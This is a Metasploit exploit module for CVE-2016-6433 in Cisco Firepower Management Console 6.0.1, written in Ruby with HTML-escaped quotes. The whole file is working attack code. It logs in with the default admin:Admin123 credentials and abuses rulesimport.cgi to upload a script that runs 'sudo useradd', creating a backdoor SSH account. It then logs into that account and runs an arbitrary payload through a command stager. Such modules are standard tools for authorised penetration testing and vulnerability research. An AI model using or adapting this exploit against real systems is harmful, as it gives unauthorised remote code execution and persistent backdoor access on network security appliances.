# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  include Msf::Exploit::Remote::SSH

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Cisco Firepower Management Console 6.0 Post Authentication UserAdd Vulnerability",
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability found in Cisco Firepower Management Console.
        The management system contains a configuration flaw that allows the www user to
        execute the useradd binary, which can be abused to create backdoor accounts.
        Authentication is required to exploit this vulnerability.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Matt&#039;,  # Original discovery & PoC
          &#039;sinn3r&#039; # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2016-6433&#039; ],
          [ &#039;URL&#039;, &#039;https://blog.korelogic.com/blog/2016/10/10/virtual_appliance_spelunking&#039; ]
        ],
      &#039;Platform&#039;       => &#039;linux&#039;,
      &#039;Arch&#039;           => ARCH_X86,
      &#039;Targets&#039;        =>
        [
          [ &#039;Cisco Firepower Management Console 6.0.1 (build 1213)&#039;, {} ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;Oct 10 2016&#039;,
      &#039;CmdStagerFlavor&#039;=> %w{ echo },
      &#039;DefaultOptions&#039; =>
        {
          &#039;SSL&#039;        => &#039;true&#039;,
          &#039;SSLVersion&#039; => &#039;Auto&#039;,
          &#039;RPORT&#039;      => 443
        },
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        # admin:Admin123 is the default credential for 6.0.1
        OptString.new(&#039;USERNAME&#039;, [true, &#039;Username for Cisco Firepower Management console&#039;, &#039;admin&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [true, &#039;Password for Cisco Firepower Management console&#039;, &#039;Admin123&#039;]),
        OptString.new(&#039;NEWSSHUSER&#039;, [false, &#039;New backdoor username (Default: Random)&#039;]),
        OptString.new(&#039;NEWSSHPASS&#039;, [false, &#039;New backdoor password (Default: Random)&#039;]),
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to Cisco Firepower Management console&#039;, &#039;/&#039;]),
        OptInt.new(&#039;SSHPORT&#039;, [true, &#039;Cisco Firepower Management console\&#039;s SSH port&#039;, 22])
      ], self.class)
  end

  def check
    # For this exploit to work, we need to check two services:
    # * HTTP - To create the backdoor account for SSH
    # * SSH  - To execute our payload

    vprint_status(&#039;Checking Cisco Firepower Management console...&#039;)
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;/img/favicon.png?v=6.0.1-1213&#039;)
    })

    if res && res.code == 200
      vprint_status("Console is found.")
      vprint_status("Checking SSH service.")
      begin
        ::Timeout.timeout(datastore[&#039;SSH_TIMEOUT&#039;]) do
          Net::SSH.start(rhost, &#039;admin&#039;,
            port: datastore[&#039;SSHPORT&#039;],
            password: Rex::Text.rand_text_alpha(5),
            auth_methods: [&#039;password&#039;],
            non_interactive: true
          )
        end
      rescue Timeout::Error
        vprint_error(&#039;The SSH connection timed out.&#039;)
        return Exploit::CheckCode::Unknown
      rescue Net::SSH::AuthenticationFailed
        # Hey, it talked. So that means SSH is running.
        return Exploit::CheckCode::Appears
      rescue Net::SSH::Exception => e
        vprint_error(e.message)
      end
    end

    Exploit::CheckCode::Safe
  end

  def get_sf_action_id(sid)
    requirements = {}

    print_status(&#039;Attempting to obtain sf_action_id from rulesimport.cgi&#039;)

    uri = normalize_uri(target_uri.path, &#039;DetectionPolicy/rules/rulesimport.cgi&#039;)
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => uri,
      &#039;cookie&#039; => "CGISESSID=#{sid}"
    })

    unless res
      fail_with(Failure::Unknown, &#039;Failed to obtain rules import requirements.&#039;)
    end

    sf_action_id = res.body.scan(/sf_action_id = &#039;(.+)&#039;;/).flatten[1]

    unless sf_action_id
      fail_with(Failure::Unknown, &#039;Unable to obtain sf_action_id from rulesimport.cgi&#039;)
    end

    sf_action_id
  end

  def create_ssh_backdoor(sid, user, pass)
    uri          = normalize_uri(target_uri.path, &#039;DetectionPolicy/rules/rulesimport.cgi&#039;)
    sf_action_id = get_sf_action_id(sid)
    sh_name      = &#039;exploit.sh&#039;

    print_status("Attempting to create an SSH backdoor as #{user}:#{pass}")

    mime_data = Rex::MIME::Message.new
    mime_data.add_part(&#039;Import&#039;, nil, nil, &#039;form-data; name="action_submit"&#039;)
    mime_data.add_part(&#039;file&#039;, nil, nil, &#039;form-data; name="source"&#039;)
    mime_data.add_part(&#039;1&#039;, nil, nil, &#039;form-data; name="manual_update"&#039;)
    mime_data.add_part(sf_action_id, nil, nil, &#039;form-data; name="sf_action_id"&#039;)
    mime_data.add_part(
      "sudo useradd -g ldapgroup -p `openssl passwd -1 #{pass}` #{user}; rm /var/sf/SRU/#{sh_name}",
      &#039;application/octet-stream&#039;,
      nil,
      "form-data; name=\"file\"; filename=\"#{sh_name}\""
    )

    send_request_cgi({
      &#039;method&#039;   => &#039;POST&#039;,
      &#039;uri&#039;      => uri,
      &#039;cookie&#039;   => "CGISESSID=#{sid}",
      &#039;ctype&#039;    => "multipart/form-data; boundary=#{mime_data.bound}",
      &#039;data&#039;     => mime_data.to_s,
      &#039;vars_get&#039; => { &#039;no_mojo&#039; => &#039;1&#039; },
    })
  end

  def generate_new_username
    datastore[&#039;NEWSSHUSER&#039;] || Rex::Text.rand_text_alpha(5)
  end

  def generate_new_password
    datastore[&#039;NEWSSHPASS&#039;] || Rex::Text.rand_text_alpha(5)
  end

  def report_cred(opts)
    service_data = {
      address: rhost,
      port: rport,
      service_name: &#039;cisco&#039;,
      protocol: &#039;tcp&#039;,
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: DateTime.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def do_login
    console_user = datastore[&#039;USERNAME&#039;]
    console_pass = datastore[&#039;PASSWORD&#039;]
    uri          = normalize_uri(target_uri.path, &#039;login.cgi&#039;)

    print_status("Attempting to login in as #{console_user}:#{console_pass}")

    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => uri,
      &#039;vars_post&#039; => {
        &#039;username&#039; => console_user,
        &#039;password&#039; => console_pass,
        &#039;target&#039;   => &#039;&#039;
      }
    })

    unless res
      fail_with(Failure::Unknown, &#039;Connection timed out while trying to log in.&#039;)
    end

    res_cookie = res.get_cookies
    if res.code == 302 && res_cookie.include?(&#039;CGISESSID&#039;)
      cgi_sid = res_cookie.scan(/CGISESSID=(\w+);/).flatten.first
      print_status("CGI Session ID: #{cgi_sid}")
      print_good("Authenticated as #{console_user}:#{console_pass}")
      report_cred(username: console_user, password: console_pass)
      return cgi_sid
    end

    nil
  end

  def execute_command(cmd, opts = {})
    @first_exec = true
    cmd.gsub!(/\/tmp/, &#039;/usr/tmp&#039;)

    # Weird hack for the cmd stager.
    # Because it keeps using > to write the payload.
    if @first_exec
      @first_exec = false
    else
      cmd.gsub!(/>>/, &#039; > &#039;)
    end

    begin
      Timeout.timeout(3) do
        @ssh_socket.exec!("#{cmd}\n")
        vprint_status("Executing #{cmd}")
      end
    rescue Timeout::Error
      fail_with(Failure::Unknown, &#039;SSH command timed out&#039;)
    rescue Net::SSH::ChannelOpenFailed
      print_status(&#039;Trying again due to Net::SSH::ChannelOpenFailed (sometimes this happens)&#039;)
      retry
    end
  end

  def init_ssh_session(user, pass)
    print_status("Attempting to log into SSH as #{user}:#{pass}")

    factory = ssh_socket_factory
    opts = {
      auth_methods: [&#039;password&#039;, &#039;keyboard-interactive&#039;],
      port: datastore[&#039;SSHPORT&#039;],
      use_agent: false,
      config: false,
      password: pass,
      proxy: factory,
      non_interactive: true
    }

    opts.merge!(verbose: :debug) if datastore[&#039;SSH_DEBUG&#039;]

    begin
      ssh = nil
      ::Timeout.timeout(datastore[&#039;SSH_TIMEOUT&#039;]) do
        @ssh_socket = Net::SSH.start(rhost, user, opts)
      end
    rescue Net::SSH::Exception => e
      fail_with(Failure::Unknown, e.message)
    end
  end

  def exploit
    # To exploit the useradd vuln, we need to login first.
    sid = do_login
    return unless sid

    # After login, we can call the useradd utility to create a backdoor user
    new_user = generate_new_username
    new_pass = generate_new_password
    create_ssh_backdoor(sid, new_user, new_pass)

    # Log into the SSH backdoor account
    init_ssh_session(new_user, new_pass)

    begin
      execute_cmdstager({:linemax => 500})
    ensure
      @ssh_socket.close
    end
  end

end

